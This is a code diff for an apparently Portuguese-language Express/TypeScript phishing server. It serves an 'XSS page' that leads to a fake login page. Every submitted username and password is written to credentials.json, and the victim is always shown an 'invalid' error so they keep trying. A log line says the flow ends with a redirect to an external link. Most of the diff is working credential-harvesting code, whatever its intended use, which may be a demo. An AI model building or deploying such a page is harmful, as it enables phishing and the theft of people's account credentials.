@@ -14,24 +14,20 @@ app.use(express.json());
 app.use(express.static('public'));
 app.use('/assets', express.static('src/assets'));
 
-// Counter for login attempts
-let tentativas: number = 5;
+const tentativas: number = 5;
 
-// Function to open browser
 const openBrowser = (url: string): void => {
     const start = process.platform === 'darwin' ? 'open' :
-                  process.platform === 'win32' ? 'start' : 'xdg-open';
+        process.platform === 'win32' ? 'start' : 'xdg-open';
     exec(`${start} ${url}`);
 };
 
-// Interface for login data
 interface LoginData {
     usuario: string;
     senha: string;
     timestamp?: string;
 }
 
-// Function to save credentials to JSON file
 const saveCredentialsToJson = (usuario: string, senha: string): void => {
     const loginData: LoginData = {
         usuario: usuario,
@@ -42,7 +38,7 @@ const saveCredentialsToJson = (usuario: string, senha: string): void => {
     const credentialsPath = path.join(__dirname, '../credentials.json');
 
     try {
-        // Read existing data or create empty array
+
         let existingData: LoginData[] = [];
         if (fs.existsSync(credentialsPath)) {
             const fileContent = fs.readFileSync(credentialsPath, 'utf8').trim();
@@ -67,12 +63,26 @@ const saveCredentialsToJson = (usuario: string, senha: string): void => {
     }
 };
 
-// Route for the main login page
+// Route for the XSS page (initial page)
 app.get('/', (req: Request, res: Response): void => {
+    try {
+        const htmlTemplate = fs.readFileSync(path.join(__dirname, 'xss_page.html'), 'utf8');
+        let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());
+        htmlWithData = htmlWithData.replace('{{error_message}}', '');
+
+        res.send(htmlWithData);
+    } catch (error) {
+        console.error('Error reading XSS HTML template:', error);
+        res.status(500).send('Internal Server Error');
+    }
+});
+
+// Route for the fake page (redirected from XSS page)
+app.get('/fake_page.html', (req: Request, res: Response): void => {
     try {
         const htmlTemplate = fs.readFileSync(path.join(__dirname, 'fake_page.html'), 'utf8');
         let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());
-        
+
         // Show error message if there's an error parameter
         const showError = req.query.error === 'invalid';
         if (showError) {
@@ -80,10 +90,10 @@ app.get('/', (req: Request, res: Response): void => {
         } else {
             htmlWithData = htmlWithData.replace('{{error_message}}', '');
         }
-        
+
         res.send(htmlWithData);
     } catch (error) {
-        console.error('Error reading HTML template:', error);
+        console.error('Error reading fake page HTML template:', error);
         res.status(500).send('Internal Server Error');
     }
 });
@@ -95,17 +105,20 @@ app.post('/login', (req: Request, res: Response): void => {
     // Save credentials to JSON file
     saveCredentialsToJson(usuario, senha);
 
-    // Decrease attempts counter
-    tentativas = Math.max(0, tentativas - 1);
-
     // Log the attempt and redirect back with error
     console.log(`Login attempt saved: ${usuario}`);
-    res.redirect('/?error=invalid');
+    res.redirect('/fake_page.html?error=invalid');
+});
+
+// Handle help link
+app.get('/help', (req: Request, res: Response): void => {
+    res.send('<h1>Ajuda - Soluções para problemas no Acesso</h1><p>Entre em contato com o suporte técnico.</p>');
 });
 
 app.listen(PORT, (): void => {
     const url = `http://localhost:${PORT}`;
     console.log(`Servidor rodando em ${url}`);
+    console.log('Iniciando com XSS page, que redirecionará para fake page e depois para link externo...');
 
     // Automatically open browser
     console.log('Abrindo navegador...');
